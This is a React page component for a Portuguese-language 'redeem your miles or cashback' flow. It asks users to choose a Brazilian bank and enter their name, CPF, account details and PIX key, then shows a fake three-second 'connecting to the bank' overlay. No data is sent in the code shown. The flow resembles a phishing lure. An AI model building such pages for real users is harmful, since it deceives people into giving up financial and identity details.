import { useState, useCallback } from "react";
import { useLocation, useSearch } from "wouter";
import { ArrowLeft, Building2, CheckCircle2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import Header from "@/components/Header";
import PromoBar from "@/components/PromoBar";
import Footer from "@/components/Footer";
import LoadingOverlay from "@/components/LoadingOverlay";

const bancos = [
  { id: "itau", nome: "Itau", cor: "#003399" },
  { id: "santander", nome: "Santander", cor: "#CC0000" },
  { id: "bradesco", nome: "Bradesco", cor: "#CC092F" },
  { id: "nubank", nome: "Nubank", cor: "#820AD1" },
  { id: "bb", nome: "Banco do Brasil", cor: "#FFCC00" },
  { id: "caixa", nome: "Caixa", cor: "#005CA9" },
];

function formatCpf(value: string) {
  const digits = value.replace(/\D/g, "").slice(0, 11);
  if (digits.length <= 3) return digits;
  if (digits.length <= 6) return `${digits.slice(0, 3)}.${digits.slice(3)}`;
  if (digits.length <= 9) return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
  return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
}

export default function Banco() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);
  const tipo = params.get("tipo") || "milhas";

  const [bancoSelecionado, setBancoSelecionado] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  const [nome, setNome] = useState("");
  const [cpf, setCpf] = useState("");
  const [agencia, setAgencia] = useState("");
  const [conta, setConta] = useState("");
  const [pix, setPix] = useState("");

  const tipoLabel = tipo === "milhas" ? "Milhas Aereas" : tipo === "cashback" ? "Cashback" : "Produtos do Site";

  const handleBancoClick = useCallback((id: string) => {
    setBancoSelecionado(id);
  }, []);

  const handleEnviar = useCallback(() => {
    if (!nome.trim() || !cpf.trim() || !pix.trim()) return;
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setLocation(`/confirmacao?tipo=${tipo}&banco=${bancoSelecionado}`);
    }, 3000);
  }, [nome, cpf, pix, tipo, bancoSelecionado, setLocation]);

  const bancoNome = bancos.find(b => b.id === bancoSelecionado)?.nome || "";

  return (
    <div className="min-h-screen bg-[#F6F6F6] flex flex-col" data-testid="banco-page">
      <PromoBar />
      <Header />

      <main className="flex-1 py-12 px-4">
        <div className="max-w-3xl mx-auto">
          <button
            onClick={() => setLocation("/resgate")}
            className="flex items-center gap-2 text-[#6F6F6F] text-sm mb-8 hover:text-[#EC008C] transition-colors"
            data-testid="button-voltar-banco"
          >
            <ArrowLeft className="w-4 h-4" />
            Voltar para opcoes de resgate
          </button>

          <div className="text-center mb-10">
            <p className="text-sm text-[#EC008C] font-semibold mb-1" data-testid="text-tipo-resgate">
              {tipoLabel}
            </p>
            <h1 className="text-2xl sm:text-3xl font-bold text-[#222222] mb-2" data-testid="text-banco-title">
              Escolha seu banco para receber
            </h1>
            <p className="text-[#6F6F6F] text-base" data-testid="text-banco-subtitle">
              Selecione o banco onde deseja receber
            </p>
          </div>

          <div className="grid grid-cols-2 sm:grid-cols-3 gap-4 mb-10">
            {bancos.map((banco) => (
              <button
                key={banco.id}
                onClick={() => handleBancoClick(banco.id)}
                className={`relative bg-white border-2 rounded-xl p-5 flex flex-col items-center gap-3 transition-all cursor-pointer ${
                  bancoSelecionado === banco.id
                    ? "border-[#EC008C] shadow-lg"
                    : "border-[#E5E5E5] hover:border-[#EC008C]/50 hover:shadow-md"
                }`}
                data-testid={`banco-${banco.id}`}
              >
                {bancoSelecionado === banco.id && (
                  <CheckCircle2
                    className="absolute top-2 right-2 w-5 h-5 text-[#EC008C]"
                    data-testid={`banco-check-${banco.id}`}
                  />
                )}
                <div
                  className="w-12 h-12 rounded-full flex items-center justify-center"
                  style={{ backgroundColor: banco.cor + "1A" }}
                >
                  <Building2 className="w-6 h-6" style={{ color: banco.cor }} />
                </div>
                <span className="text-sm font-semibold text-[#222222]">{banco.nome}</span>
              </button>
            ))}
          </div>

          {bancoSelecionado && (
            <div
              className="bg-white border border-[#E5E5E5] rounded-2xl p-6 sm:p-8"
              style={{ boxShadow: "0 4px 12px rgba(0,0,0,0.06)" }}
              data-testid="form-deposito"
            >
              <h3 className="text-lg font-bold text-[#222222] mb-6" data-testid="text-form-title">
                Dados para Deposito — <span className="text-[#EC008C]">{bancoNome}</span>
              </h3>

              <div className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-[#444] mb-1">Nome completo</label>
                  <input
                    type="text"
                    value={nome}
                    onChange={(e) => setNome(e.target.value)}
                    placeholder="Digite seu nome completo"
                    className="w-full px-4 py-3 rounded-xl border border-[#E5E5E5] bg-white text-sm text-[#222] focus:outline-none focus:ring-2 focus:ring-[#EC008C]/30 focus:border-[#EC008C] transition-colors"
                    data-testid="input-nome"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-[#444] mb-1">CPF</label>
                  <input
                    type="text"
                    value={cpf}
                    onChange={(e) => setCpf(formatCpf(e.target.value))}
                    placeholder="000.000.000-00"
                    maxLength={14}
                    className="w-full px-4 py-3 rounded-xl border border-[#E5E5E5] bg-white text-sm text-[#222] focus:outline-none focus:ring-2 focus:ring-[#EC008C]/30 focus:border-[#EC008C] transition-colors"
                    data-testid="input-cpf-banco"
                  />
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-medium text-[#444] mb-1">Agencia</label>
                    <input
                      type="text"
                      value={agencia}
                      onChange={(e) => setAgencia(e.target.value.replace(/\D/g, ""))}
                      placeholder="0000"
                      className="w-full px-4 py-3 rounded-xl border border-[#E5E5E5] bg-white text-sm text-[#222] focus:outline-none focus:ring-2 focus:ring-[#EC008C]/30 focus:border-[#EC008C] transition-colors"
                      data-testid="input-agencia"
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-[#444] mb-1">Conta</label>
                    <input
                      type="text"
                      value={conta}
                      onChange={(e) => setConta(e.target.value.replace(/\D/g, ""))}
                      placeholder="00000-0"
                      className="w-full px-4 py-3 rounded-xl border border-[#E5E5E5] bg-white text-sm text-[#222] focus:outline-none focus:ring-2 focus:ring-[#EC008C]/30 focus:border-[#EC008C] transition-colors"
                      data-testid="input-conta"
                    />
                  </div>
                </div>

                <div>
                  <label className="block text-sm font-medium text-[#444] mb-1">Chave PIX</label>
                  <input
                    type="text"
                    value={pix}
                    onChange={(e) => setPix(e.target.value)}
                    placeholder="CPF, e-mail, telefone ou chave aleatoria"
                    className="w-full px-4 py-3 rounded-xl border border-[#E5E5E5] bg-white text-sm text-[#222] focus:outline-none focus:ring-2 focus:ring-[#EC008C]/30 focus:border-[#EC008C] transition-colors"
                    data-testid="input-pix"
                  />
                </div>

                <Button
                  onClick={handleEnviar}
                  disabled={!nome.trim() || !cpf.trim() || !pix.trim()}
                  className="w-full bg-[#E0007A] border-[#E0007A] text-white font-semibold rounded-full mt-2 disabled:opacity-50"
                  data-testid="button-enviar"
                >
                  Continuar
                </Button>
              </div>
            </div>
          )}
        </div>
      </main>

      <Footer />

      <LoadingOverlay
        visible={loading}
        title="Processando seus dados..."
        subtitle="Conectando ao banco..."
        duration={3000}
        testId="loading-banco-overlay"
      />
    </div>
  );
}
